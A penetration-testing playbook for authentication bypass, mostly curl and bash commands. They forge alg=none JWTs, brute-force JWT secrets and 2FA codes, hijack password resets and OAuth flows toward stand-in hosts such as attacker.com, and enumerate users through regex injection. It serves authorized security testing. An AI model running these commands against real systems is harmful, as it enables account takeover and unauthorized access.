# Playbook: Authentication Bypass Checklist

## Purpose
Systematically enumerate and test weaknesses in authentication mechanisms.
Covers JWT, session management, forced browsing, account takeover vectors,
and multi-factor authentication bypasses.
Input: login endpoint, session token, or authenticated app.

---

## Step 1 — Recon the Auth Mechanism

```bash
# What auth does the target use?
# Check headers in httpx output and responses
curl -sI "https://TARGET/api/me" | grep -iE "www-authenticate|set-cookie|authorization"

# JWT detection
TOKEN="your_access_token"
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Cookie flags check
curl -sI "https://TARGET/login" | grep -i "set-cookie" | grep -iE "httponly|secure|samesite"
```

---

## Step 2 — JWT Attacks

### Decode and inspect
```bash
# Decode JWT manually
TOKEN="eyJhbGci..."
echo $TOKEN | python3 -c "
import sys, base64, json
parts = sys.stdin.read().strip().split('.')
for i, p in enumerate(parts[:2]):
    padded = p + '=' * (-len(p) % 4)
    print(f'Part {i+1}:', json.dumps(json.loads(base64.b64decode(padded)), indent=2))
"
```

### Algorithm confusion attacks
```bash
# none algorithm
# Manually set alg to "none" and remove signature
python3 -c "
import base64, json
header = json.dumps({'alg':'none','typ':'JWT'}).encode()
payload = json.dumps({'sub':'1','role':'admin','exp':9999999999}).encode()
h = base64.urlsafe_b64encode(header).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(payload).rstrip(b'=').decode()
print(f'{h}.{p}.')
"

# RS256 → HS256 confusion
# If server uses RS256, try signing with HS256 using the PUBLIC KEY as secret
# Tool: https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py TOKEN -X k -pk public.pem

# JWT Secret brute force
python3 jwt_tool.py TOKEN -C -d ~/wordlists/jwt-secrets.txt

# All attacks at once
python3 jwt_tool.py TOKEN -T  # tamper mode
python3 jwt_tool.py TOKEN -X a  # all algorithm attacks
```

### JWT claim tampering
```bash
# If secret is weak or none algorithm works:
# - Change "role": "user" → "role": "admin"
# - Change "sub": "1" → "sub": "2" (IDOR)
# - Change "exp" to far future
# - Add "admin": true
# - Change "email": "attacker@evil.com"
```

---

## Step 3 — Session Management

```bash
# Session fixation — check if session ID changes after login
SESSION_BEFORE=$(curl -sc /tmp/cookies_before.txt "https://TARGET/login" | grep -i "session")
# Login...
SESSION_AFTER=$(cat /tmp/cookies_after.txt | grep -i "session")
[ "$SESSION_BEFORE" = "$SESSION_AFTER" ] && echo "[SESSION FIXATION] ID did not rotate on login"

# Session prediction — check for sequential/predictable session IDs
# Grab 10 sessions and analyze entropy
for i in $(seq 10); do
  curl -sc /tmp/sess_$i.txt "https://TARGET/" > /dev/null
  grep -i "session\|token" /tmp/sess_$i.txt | awk '{print $NF}'
done

# Cookie security flags
curl -sI "https://TARGET/" | grep -i "set-cookie" | grep -v "httponly" && echo "[MISSING HttpOnly]"
curl -sI "https://TARGET/" | grep -i "set-cookie" | grep -v "secure" && echo "[MISSING Secure flag]"
curl -sI "https://TARGET/" | grep -i "set-cookie" | grep -v "samesite" && echo "[MISSING SameSite]"
```

---

## Step 4 — Forced Browsing & Authorization Tests

```bash
# After login, access pages without authentication
curl -sk "https://TARGET/admin/dashboard" --cookie "" -w "%{http_code}"
curl -sk "https://TARGET/api/admin/users" -w "%{http_code}"

# Remove auth header and retry
RESPONSE_WITH_AUTH=$(curl -sk "https://TARGET/api/profile" -H "Authorization: Bearer TOKEN")
RESPONSE_WITHOUT=$(curl -sk "https://TARGET/api/profile")
[ "$RESPONSE_WITH_AUTH" = "$RESPONSE_WITHOUT" ] && echo "[AUTH NOT ENFORCED]"

# Test common admin paths (use wayback/dirb wordlist)
ADMIN_PATHS=("/admin" "/admin/users" "/admin/settings" "/admin/logs"
             "/management" "/dashboard" "/console" "/internal"
             "/api/admin" "/api/v1/admin" "/api/internal")

for path in "${ADMIN_PATHS[@]}"; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET$path")
  [ "$status" != "404" ] && [ "$status" != "301" ] && echo "[$status] $path"
done
```

---

## Step 5 — Password Reset Vulnerabilities

```bash
# Test 1 — Host header injection in reset email
curl -sk -X POST "https://TARGET/forgot-password" \
  -H "Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.com"}'
# Check if reset link in email uses attacker.com

# Test 2 — Reset token entropy/brute force
# Request multiple tokens, compare for patterns

# Test 3 — Token reuse after use
TOKEN="used_reset_token"
curl -sk -X POST "https://TARGET/reset-password" \
  -d "token=$TOKEN&password=NewPass123!"
curl -sk -X POST "https://TARGET/reset-password" \
  -d "token=$TOKEN&password=AnotherPass456!"
# If both succeed → token not invalidated

# Test 4 — No token required (IDOR in reset)
curl -sk -X POST "https://TARGET/reset-password" \
  -d "user_id=VICTIM_ID&password=hacked123"

# Test 5 — Response body leaks token
# Inspect the /forgot-password response for token in JSON
curl -sk -X POST "https://TARGET/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"email": "test@youremail.com"}' | python3 -m json.tool
```

---

## Step 6 — OAuth / SSO Misconfigurations

```bash
# Open redirect in redirect_uri
# OAuth flow: /oauth/authorize?client_id=X&redirect_uri=ATTACKER&response_type=code
curl -sk "https://TARGET/oauth/authorize?\
client_id=LEGIT_CLIENT&\
redirect_uri=https://attacker.com/callback&\
response_type=code&scope=openid"
# If redirected to attacker.com → auth code theft

# Redirect_uri validation bypass
# Try: https://legitimate.com.attacker.com
# Try: https://legitimate.com@attacker.com
# Try: https://attacker.com?q=https://legitimate.com
# Try: https://legitimate.com/../../attacker.com

# State parameter missing (CSRF on OAuth)
curl -sk "https://TARGET/oauth/authorize?\
client_id=X&redirect_uri=CALLBACK&response_type=code"
# No state param = CSRF attack on OAuth flow

# Access token in URL/referrer
# Check if Referrer header leaks access_token from ?access_token= in URL
```

---

## Step 7 — 2FA / MFA Bypasses

```bash
# Test 1 — Skip 2FA step entirely
# After entering password but before 2FA, directly access authenticated endpoint
curl -sk "https://TARGET/dashboard" --cookie "partial_session=..."

# Test 2 — 2FA code brute force (no rate limiting)
for code in $(seq -w 000000 999999); do
  response=$(curl -sk -X POST "https://TARGET/verify-2fa" \
    -d "code=$code&session=PARTIAL_SESSION")
  echo "$response" | grep -q "success\|dashboard" && echo "CODE: $code" && break
  sleep 0.1
done

# Test 3 — 2FA code reuse
CODE="123456"  # used OTP
curl -sk -X POST "https://TARGET/verify-2fa" -d "code=$CODE"
curl -sk -X POST "https://TARGET/verify-2fa" -d "code=$CODE"
# If second request succeeds → OTP reuse allowed

# Test 4 — Response manipulation (Burp)
# Change {"success":false} → {"success":true} in 2FA response
# Change HTTP 401 → 200

# Test 5 — Backup code abuse
# Are backup codes single-use? Try same backup code twice
```

---

## Step 8 — Account Takeover via Username/Email Manipulation

```bash
# Email case variation
# Register: user@TARGET.com
# Try login as: User@TARGET.com, USER@TARGET.com, user+@TARGET.com

# Unicode normalization
# Register: "аdmin@TARGET.com" (with Cyrillic а)
# Server normalizes to admin@target.com?

# Email takeover via pre-registration
# 1. Register victim@target.com before victim does (if email not verified)
# 2. Change your email to victim's email, verify, then victim registers and gets confused

# Username trailing space
# Register: "admin " (with trailing space) — might bypass uniqueness check

# HTTP Parameter Pollution in registration
curl -sk -X POST "https://TARGET/register" \
  -d "email=attacker@evil.com&email=victim@target.com&password=test123"

# --- Regex Injection on Password Reset (Side-Channel Enumeration) ---
# If the forgot-password endpoint passes user input to a regex query (MongoDB, etc.)
# different HTTP status codes (e.g. 404 vs 502) or response times reveal matches

# Step 1: Enumerate username character by character
curl -sk -X POST "https://TARGET/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"email":"^a.*@.*"}' -o /dev/null -w "%{http_code}"
# 502 = match found (server error processing valid user), 404 = no match
# Iterate: ^a.*, ^ab.*, ^abc.* until full username is extracted

# Step 2: Enumerate domain after @
curl -sk -X POST "https://TARGET/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"email":"^knownuser@^s.*"}' -o /dev/null -w "%{http_code}"

# Automated enumeration loop
for c in {a..z} {0..9}; do
  code=$(curl -sk -X POST "https://TARGET/forgot-password" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"^${KNOWN}${c}.*@.*\"}" -o /dev/null -w "%{http_code}" -m 5)
  [ "$code" != "404" ] && echo "MATCH: $c (HTTP $code)"
done

# --- Email Array Injection on Password Reset ---
# Send email as JSON array instead of string
# System validates first email (victim) but sends reset link to second (attacker)
curl -sk -X POST "https://TARGET/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"email":["victim@target.com","attacker@evil.com"]}'

# Variations
curl -sk -X POST "https://TARGET/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"email":{"primary":"victim@target.com","secondary":"attacker@evil.com"}}'

# With nested array
curl -sk -X POST "https://TARGET/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"email":["victim@target.com"],"email":"attacker@evil.com"}'

# Also test on registration and email change endpoints
curl -sk -X POST "https://TARGET/change-email" \
  -H "Content-Type: application/json" \
  -d '{"new_email":["victim@target.com","attacker@evil.com"]}'
```

---

## Output

```
TARGET        : https://target.com
AUTH MECHANISM: JWT (RS256) + Session Cookie
─────────────────────────────────────────────────────
FINDINGS:
  [CRITICAL] JWT alg=none accepted — arbitrary claims possible
  [HIGH]     Password reset token not invalidated after use
  [HIGH]     2FA OTP reuse allowed (no single-use enforcement)
  [MEDIUM]   Session ID does not rotate after login (fixation risk)
  [MEDIUM]   Missing SameSite cookie flag on session cookie
  [LOW]      No rate limit on OTP entry endpoint
─────────────────────────────────────────────────────
NEXT STEPS:
  1. Exploit JWT none attack → access admin account
  2. Report reset token reuse as separate HIGH finding
  3. Load 03_reporting/report_writer.md for each confirmed finding
```
